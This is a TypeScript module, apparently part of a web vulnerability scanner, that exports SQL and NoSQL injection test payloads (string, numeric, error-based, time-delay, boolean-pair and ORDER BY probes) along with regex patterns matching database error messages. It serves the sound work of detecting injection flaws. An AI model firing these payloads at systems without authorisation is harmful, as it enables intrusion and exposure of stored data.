/** SQL injection test payloads — error-based, non-destructive detection only */
export const SQLI_PAYLOADS = [
  // Classic string-based
  "' OR '1'='1",
  "' OR '1'='1' --",
  "' OR '1'='1' /*",
  '" OR "1"="1',

  // Numeric-based
  '1 OR 1=1',
  '1 OR 1=1--',
  '1; SELECT 1--',

  // Error-based
  "' AND 1=CONVERT(int, @@version)--",
  "' UNION SELECT NULL--",
];

/** Time-based blind SQLi payloads — separated so we can measure response timing.
 *  Uses 5-second delays to reliably exceed BLIND_SQLI_THRESHOLD_MS (3500ms)
 *  while leaving 1.5s margin for network latency. */
export const SQLI_TIME_PAYLOADS = [
  // MySQL
  "' OR SLEEP(5)--",
  "1 OR SLEEP(5)--",
  // MSSQL
  "1; WAITFOR DELAY '0:0:5'--",
  // PostgreSQL
  "'; SELECT pg_sleep(5)--",
  // SQLite (no sleep, but heavy computation)
  "1 OR 1=1 AND RANDOMBLOB(500000000)--",
];

/** SQL error signatures indicating injection vulnerability */
export const SQL_ERROR_PATTERNS = [
  // MySQL / MariaDB
  /you have an error in your sql syntax/i,
  /SQL syntax.*?MySQL/i,
  /Warning.*?\Wmysqli?_/i,
  /mysql_fetch/i,
  /mysql_num_rows/i,
  /MariaDB server version/i,

  // PostgreSQL
  /PostgreSQL.*?ERROR/i,
  /pg_query/i,
  /pg_exec/i,
  /psycopg2\./i,
  /PG::SyntaxError/i,
  /unterminated string literal/i,

  // Microsoft SQL Server
  /unclosed quotation mark/i,
  /microsoft ole db provider/i,
  /Microsoft SQL Native Client/i,
  /\bODBC SQL Server Driver\b/i,
  /SQL Server.*?\d{4,}/i,

  // Oracle
  /ORA-\d{5}/,
  /quoted string not properly terminated/i,
  /oracle\.jdbc/i,
  /XMLDOM/i,

  // SQLite
  /sqlite3?\.OperationalError/i,
  /SQLite\/JDBCDriver/i,
  /unrecognized token/i,

  // Generic
  /SQLSTATE\[\w+\]/,
  /SQL command not properly ended/i,
  /invalid input syntax for/i,
  /Dynamic SQL Error/i,
  /unexpected end of SQL command/i,
];

/** Boolean-based blind SQLi payload pairs — compare true vs false condition */
export const SQLI_BOOLEAN_PAYLOADS: Array<{ truePayload: string; falsePayload: string }> = [
  { truePayload: "' OR '1'='1", falsePayload: "' OR '1'='2" },
  { truePayload: '1 OR 1=1', falsePayload: '1 OR 1=2' },
  { truePayload: "' OR 1=1--", falsePayload: "' OR 1=2--" },
];

/** Union-based SQLi detection — ORDER BY probes to find column count */
export const SQLI_UNION_ORDER_BY_PROBES = Array.from({ length: 10 }, (_, i) => `' ORDER BY ${i + 1}--`);

/** NoSQL injection payloads */
export const NOSQL_PAYLOADS = [
  '{"$gt": ""}',
  '{"$ne": null}',
  '{"$regex": ".*"}',
  '[$ne]=1',
  '[$gt]=',
  "true, $where: '1 == 1'",
];

/** NoSQL error signatures */
export const NOSQL_ERROR_PATTERNS = [
  /MongoServerError|MongoError|BSONTypeError/i,
  /cast to ObjectId failed|BSONTypeError/i,
  /mongoose.*validation.*failed/i,
  /E11000 duplicate key error/i,
];
